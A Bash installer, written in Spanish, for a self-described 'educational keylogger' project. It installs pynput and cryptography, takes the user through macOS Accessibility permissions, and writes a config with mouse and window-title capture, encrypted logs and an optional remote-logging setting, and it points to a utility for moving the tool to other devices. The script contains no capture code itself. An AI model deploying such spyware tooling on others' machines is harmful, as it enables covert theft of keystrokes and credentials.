#!/bin/bash

# Script de instalación automática para Keylogger Educativo
# Autor: Alvaro Manzo

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Función para imprimir con colores
print_color() {
    printf "${!1}%s${NC}\n" "$2"
}

# Banner de inicio
print_banner() {
    echo
    print_color "CYAN" "╔══════════════════════════════════════════════════════════╗"
    print_color "CYAN" "║            KEYLOGGER EDUCATIVO - INSTALADOR              ║"
    print_color "CYAN" "║                    Versión 2.0                           ║"
    print_color "CYAN" "╚══════════════════════════════════════════════════════════╝"
    echo
    print_color "RED" "⚠️  AVISO LEGAL: Solo para uso educativo y sistemas propios"
    print_color "YELLOW" "El uso indebido puede ser ilegal."
    echo
}

# Verificar Python
check_python() {
    print_color "BLUE" "🔍 Verificando Python..."
    
    if command -v python3 &> /dev/null; then
        PYTHON_CMD="python3"
        PYTHON_VERSION=$(python3 --version 2>&1 | cut -d' ' -f2)
        print_color "GREEN" "✅ Python encontrado: $PYTHON_VERSION"
    elif command -v python &> /dev/null; then
        PYTHON_CMD="python"
        PYTHON_VERSION=$(python --version 2>&1 | cut -d' ' -f2)
        print_color "GREEN" "✅ Python encontrado: $PYTHON_VERSION"
    else
        print_color "RED" "❌ Python no está instalado"
        print_color "YELLOW" "Por favor instala Python 3.7+ desde: https://www.python.org"
        exit 1
    fi
    
    # Verificar versión mínima (3.7)
    PYTHON_MAJOR=$(echo $PYTHON_VERSION | cut -d'.' -f1)
    PYTHON_MINOR=$(echo $PYTHON_VERSION | cut -d'.' -f2)
    
    if [ "$PYTHON_MAJOR" -lt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -lt 7 ]); then
        print_color "RED" "❌ Se requiere Python 3.7 o superior"
        print_color "YELLOW" "Versión actual: $PYTHON_VERSION"
        exit 1
    fi
}

# Verificar pip
check_pip() {
    print_color "BLUE" "🔍 Verificando pip..."
    
    if command -v pip3 &> /dev/null; then
        PIP_CMD="pip3"
        print_color "GREEN" "✅ pip3 encontrado"
    elif command -v pip &> /dev/null; then
        PIP_CMD="pip"
        print_color "GREEN" "✅ pip encontrado"
    else
        print_color "RED" "❌ pip no está instalado"
        print_color "YELLOW" "Intentando instalar pip..."
        
        if command -v curl &> /dev/null; then
            curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
            $PYTHON_CMD get-pip.py --user
            rm get-pip.py
            PIP_CMD="pip"
        else
            print_color "RED" "❌ No se pudo instalar pip automáticamente"
            print_color "YELLOW" "Por favor instala pip manualmente"
            exit 1
        fi
    fi
}

# Instalar dependencias
install_dependencies() {
    print_color "BLUE" "📦 Instalando dependencias..."
    
    if [ -f "requirements.txt" ]; then
        print_color "YELLOW" "Instalando desde requirements.txt..."
        
        # Intentar instalación normal
        if $PIP_CMD install -r requirements.txt; then
            print_color "GREEN" "✅ Dependencias instaladas correctamente"
        else
            print_color "YELLOW" "⚠️ Instalación normal falló, intentando con --user..."
            
            # Intentar con --user si falla
            if $PIP_CMD install --user -r requirements.txt; then
                print_color "GREEN" "✅ Dependencias instaladas con --user"
            else
                print_color "RED" "❌ Error instalando dependencias"
                print_color "YELLOW" "Intenta manualmente: $PIP_CMD install -r requirements.txt"
                exit 1
            fi
        fi
    else
        print_color "YELLOW" "requirements.txt no encontrado, instalando dependencias individuales..."
        
        # Lista de dependencias
        DEPS=("cryptography" "pynput" "psutil" "flask" "flask-cors" "qrcode" "pillow")
        
        for dep in "${DEPS[@]}"; do
            print_color "BLUE" "Instalando $dep..."
            if ! $PIP_CMD install "$dep"; then
                print_color "YELLOW" "Intentando con --user para $dep..."
                $PIP_CMD install --user "$dep"
            fi
        done
        
        print_color "GREEN" "✅ Dependencias instaladas"
    fi
}

# Verificar permisos (macOS)
check_permissions_macos() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        print_color "BLUE" "🔒 Verificando permisos de macOS..."
        print_color "YELLOW" "⚠️ IMPORTANTE para macOS:"
        print_color "YELLOW" "1. Ve a: Configuración del Sistema > Privacidad y Seguridad"
        print_color "YELLOW" "2. Busca 'Accesibilidad' en la barra lateral"
        print_color "YELLOW" "3. Haz clic en el botón 'i' junto a Accesibilidad"
        print_color "YELLOW" "4. Añade Terminal (o tu editor de código) a la lista"
        print_color "YELLOW" "5. Marca la casilla para habilitar el acceso"
        echo
        print_color "CYAN" "Sin estos permisos, el keylogger no funcionará correctamente."
        echo
        read -p "Presiona Enter cuando hayas configurado los permisos..."
    fi
}

# Verificar archivos del proyecto
check_project_files() {
    print_color "BLUE" "📁 Verificando archivos del proyecto..."
    
    REQUIRED_FILES=("keylogger_advanced.py" "dashboard.py" "transfer_utility.py")
    MISSING_FILES=()
    
    for file in "${REQUIRED_FILES[@]}"; do
        if [ -f "$file" ]; then
            print_color "GREEN" "✅ $file encontrado"
        else
            print_color "RED" "❌ $file no encontrado"
            MISSING_FILES+=("$file")
        fi
    done
    
    if [ ${#MISSING_FILES[@]} -gt 0 ]; then
        print_color "RED" "❌ Archivos faltantes detectados"
        print_color "YELLOW" "Asegúrate de tener todos los archivos del proyecto"
        exit 1
    fi
    
    # Verificar directorio templates
    if [ -d "templates" ] && [ -f "templates/dashboard.html" ]; then
        print_color "GREEN" "✅ templates/dashboard.html encontrado"
    else
        print_color "YELLOW" "⚠️ Dashboard HTML no encontrado, creando directorio..."
        mkdir -p templates
    fi
}

# Crear configuración inicial
create_initial_config() {
    print_color "BLUE" "⚙️ Creando configuración inicial..."
    
    if [ ! -f "config.json" ]; then
        cat > config.json << EOF
{
    "log_file": "keylogger_data.enc",
    "max_file_size": 5242880,
    "capture_mouse": true,
    "capture_window_titles": true,
    "auto_backup": true,
    "backup_interval": 3600,
    "encryption_enabled": true,
    "remote_logging": false,
    "remote_host": "localhost",
    "remote_port": 9999
}
EOF
        print_color "GREEN" "✅ Archivo config.json creado"
    else
        print_color "YELLOW" "⚠️ config.json ya existe, conservando configuración actual"
    fi
}

# Prueba de funcionamiento
test_installation() {
    print_color "BLUE" "🧪 Probando la instalación..."
    
    # Probar imports básicos
    if $PYTHON_CMD -c "
import sys
try:
    from pynput import keyboard, mouse
    from cryptography.fernet import Fernet
    import flask
    import psutil
    import qrcode
    print('✅ Todas las dependencias se importaron correctamente')
except ImportError as e:
    print(f'❌ Error importando: {e}')
    sys.exit(1)
"; then
        print_color "GREEN" "✅ Prueba de imports exitosa"
    else
        print_color "RED" "❌ Prueba de imports falló"
        return 1
    fi
    
    return 0
}

# Mostrar instrucciones finales
show_final_instructions() {
    echo
    print_color "GREEN" "🎉 ¡Instalación completada exitosamente!"
    echo
    print_color "CYAN" "📖 Instrucciones de uso:"
    print_color "YELLOW" "1. Para ejecutar el keylogger principal:"
    print_color "WHITE" "   $PYTHON_CMD keylogger_advanced.py"
    echo
    print_color "YELLOW" "2. Para ejecutar el dashboard web:"
    print_color "WHITE" "   $PYTHON_CMD dashboard.py"
    print_color "WHITE" "   Luego visita: http://localhost:5000"
    echo
    print_color "YELLOW" "3. Para transferir a otros dispositivos:"
    print_color "WHITE" "   $PYTHON_CMD transfer_utility.py"
    echo
    print_color "CYAN" "📚 Para más información, lee el archivo README.md"
    echo
    print_color "RED" "⚠️ RECUERDA: Solo usar en sistemas propios y de forma ética"
    echo
}

# Función principal
main() {
    print_banner
    
    print_color "BLUE" "🚀 Iniciando instalación del Keylogger Educativo..."
    echo
    
    # Verificaciones
    check_python
    check_pip
    check_project_files
    
    # Permisos específicos de macOS
    check_permissions_macos
    
    # Instalación
    install_dependencies
    create_initial_config
    
    # Pruebas
    if test_installation; then
        show_final_instructions
    else
        print_color "RED" "❌ La instalación se completó pero hay problemas"
        print_color "YELLOW" "Revisa los errores arriba e intenta ejecutar manualmente:"
        print_color "WHITE" "$PIP_CMD install -r requirements.txt"
        exit 1
    fi
}

# Manejo de interrupciones
trap 'echo; print_color "YELLOW" "Instalación interrumpida por el usuario"; exit 1' INT

# Ejecutar función principal
main
